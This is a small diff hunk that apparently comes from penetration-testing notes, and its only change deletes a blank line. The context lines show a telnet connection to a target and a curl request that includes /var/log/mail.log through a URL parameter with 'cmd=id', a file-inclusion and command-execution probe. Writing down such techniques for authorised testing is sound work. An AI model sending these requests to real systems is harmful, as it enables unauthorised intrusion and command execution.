@@ -110,4 +110,3 @@ telnet $TARGET_IP $TARGET_PORT
 curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
 ```
 :::
-
